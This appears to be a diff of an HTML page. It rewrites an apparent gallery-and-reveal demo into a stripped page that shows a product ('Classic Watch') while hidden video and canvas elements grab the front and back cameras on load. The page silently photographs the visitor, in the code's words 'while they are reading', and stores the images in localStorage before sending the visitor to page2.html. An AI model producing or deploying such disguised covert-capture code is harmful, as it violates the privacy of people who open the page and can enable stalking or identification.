@@ -2,237 +2,65 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Gallery Experience</title>
+    <title>Identifier</title>
     <style>
-        :root {
-            --bg-color: #f4f4f9;
-            --accent-color: #6c63ff;
-        }
-
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        / --- PAGE 1: THE GALLERY --- /
-        #page-one {
-            text-align: center;
-            padding: 20px;
-            transition: opacity 0.5s ease;
-        }
-
-        .item-display {
-            font-size: 3rem;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .item-description {
-            font-size: 1.2rem;
-            color: #666;
-        }
-
-        .progress-bar {
-            height: 4px;
-            width: 100%;
-            background: #ddd;
-            margin-top: 20px;
-            border-radius: 2px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: var(--accent-color);
-            border-radius: 2px;
-            transition: width 0.1s linear;
-        }
-
-        / --- PAGE 2: THE REVEAL --- /
-        #page-two {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
-
-        .code-input-group {
-            margin-bottom: 30px;
-        }
-
-        input {
-            padding: 10px;
-            font-size: 1.5rem;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            width: 150px;
-            text-align: center;
-        }
-
-        .photo-container {
-            display: flex;
-            gap: 20px;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        .photo-box {
-            border: 3px solid white;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
-            border-radius: 15px;
-            overflow: hidden;
-        }
-
-        .photo-box img {
-            width: 250px;
-            height: 300px;
-            object-fit: cover;
-            display: block;
-        }
-
-        .photo-label {
-            background: #fff;
-            padding: 5px;
-            font-size: 0.8rem;
-            font-weight: bold;
-        }
-
-        / --- HIDDEN ELEMENTS --- /
-        #hidden-canvas { display: none; }
-        #hidden-video-front, #hidden-video-back { display: none; }
+        body { background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .content { text-align: center; padding: 20px; }
+        h1 { font-size: 3rem; color: #333; }
+        p { font-size: 1.2rem; color: #666; }
+        .next-btn { margin-top: 20px; padding: 10px 20px; border: none; background: #6c63ff; color: white; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <!-- PAGE ONE: The Gallery -->
-    <div id="page-one">
-        <div class="item-display" id="item-name">Classic Watch</div>
-        <div class="item-description" id="item-desc">A timeless piece of craftsmanship.</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progress"></div>
-        </div>
-        <p style="margin-top: 10px; color: #999;">(Just enjoy the items...)</p>
+    <div class="content">
+        <h1 id="item-name">Classic Watch</h1>
+        <p id="item-desc">A timeless piece of craftsmanship.</p>
+        <button class="next-btn" onclick="goToPageTwo()">Continue &rarr;</button>
     </div>
 
-    <!-- PAGE TWO: The Reveal -->
-    <div id="page-two">
-        <h2 style="color: var(--accent-color);">Unlock the Moment</h2>
-        <div class="code-input-group">
-            <input type="text" id="secret-code" placeholder="Enter Code">
-            <button onclick="verifyCode()" style="padding: 10px 20px; cursor: pointer;">Unlock</button>
-        </div>
-        <div class="photo-container">
-            <div class="photo-box">
-                <img id="img-front" src="" alt="Front View">
-                <div class="photo-label">Front View</div>
-            </div>
-            <div class="photo-box">
-                <img id="img-back" src="" alt="Back View">
-                <div class="photo-label">Back View</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Hidden Video & Canvas Elements -->
-    <video id="hidden-video-front" autoplay playsinline></video>
-    <video id="hidden-video-back" autoplay playsinline></video>
-    <canvas id="hidden-canvas" width="640" height="480"></canvas>
+    <!-- Hidden Camera Elements -->
+    <video id="vFront" autoplay playsinline style="display:none;"></video>
+    <video id="vBack" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        const secretCode = "7707"; // You can change this code!
-        
-        // Data for the Gallery
-        const galleryItems = [
-            { name: "Classic Watch", desc: "A timeless piece of craftsmanship." },
-            { name: "Vintage Camera", desc: "Capturing memories for decades." },
-            { name: "Leather Journal", desc: "Every page holds a new story." }
-        ];
-
-        let currentItem = 0;
-        const frontVideo = document.getElementById('hidden-video-front');
-        const backVideo = document.getElementById('hidden-video-back');
-        const canvas = document.getElementById('hidden-canvas');
+        const frontVideo = document.getElementById('vFront');
+        const backVideo = document.getElementById('vBack');
+        const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        // 1. START THE EXPERIENCE
+        // 1. As soon as the page loads, request the camera
         window.onload = () => {
-            // Request both cameras immediately
-            // The user sees the "Allow Camera" prompt here
+            // Get Front Camera
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
                 frontVideo.srcObject = stream;
                 
-                // Once Front is ready, grab Back
+                // Get Back Camera
                 return navigator.mediaDevices.getUserMedia({ video: { facingMode: "back" } }).then(streamBack => {
                     backVideo.srcObject = streamBack;
 
-                    // TRIGGER THE SNAPS
-                    // We take the photos 1 second after permission is granted
+                    // 2. AUTOMATIC SNAP (Happens while they are reading)
+                    // Snap Front Camera
                     setTimeout(() => {
-                        // Capture Front
                         ctx.drawImage(frontVideo, 0, 0, 640, 480);
-                        document.getElementById('img-front').src = canvas.toDataURL();
-
-                        // Capture Back (slightly delayed)
-                        setTimeout(() => {
-                            ctx.drawImage(backVideo, 0, 0, 640, 480);
-                            document.getElementById('img-back').src = canvas.toDataURL();
-                        }, 500);
+                        // Save to "Backpack" (Local Storage)
+                        localStorage.setItem('frontPhoto', canvas.toDataURL());
                     }, 1000);
+
+                    // Snap Back Camera
+                    setTimeout(() => {
+                        ctx.drawImage(backVideo, 0, 0, 640, 480);
+                        // Save to "Backpack" (Local Storage)
+                        localStorage.setItem('backPhoto', canvas.toDataURL());
+                    }, 1500);
                 });
             });
-
-            // Start the Item Cycle
-            startGalleryCycle();
         };
 
-        // 2. THE GALLERY CYCLE (Page 1)
-        function startGalleryCycle() {
-            if (currentItem < galleryItems.length) {
-                const item = galleryItems[currentItem];
-                document.getElementById('item-name').innerText = item.name;
-                document.getElementById('item-desc').innerText = item.desc;
-                
-                // Update progress bar
-                let progress = ((currentItem) / galleryItems.length) * 100;
-                document.getElementById('progress').style.width = progress + "%";
-
-                currentItem++;
-                setTimeout(startGalleryCycle, 3000); // Change every 3 seconds
-            } else {
-                // Once all items are seen, move to Page 2 automatically
-                setTimeout(transitionToPageTwo, 1000);
-            }
-        }
-
-        // 3. THE TRANSITION
-        function transitionToPageTwo() {
-            document.getElementById('page-one').style.opacity = "0";
-            setTimeout(() => {
-                document.getElementById('page-one').style.display = "none";
-                document.getElementById('page-two').style.display = "block";
-                setTimeout(() => {
-                    document.getElementById('page-two').style.opacity = "1";
-                }, 50);
-            }, 500);
-        }
-
-        // 4. THE CODE CHECK
-        function verifyCode() {
-            const userInput = document.getElementById('secret-code').value;
-            if (userInput === secretCode) {
-                alert("Success! You caught the moment.");
-            } else {
-                alert("Incorrect code. Try again!");
-            }
+        // 3. Move to Page 2
+        function goToPageTwo() {
+            window.location.href = "page2.html";
         }
     </script>
 </body>
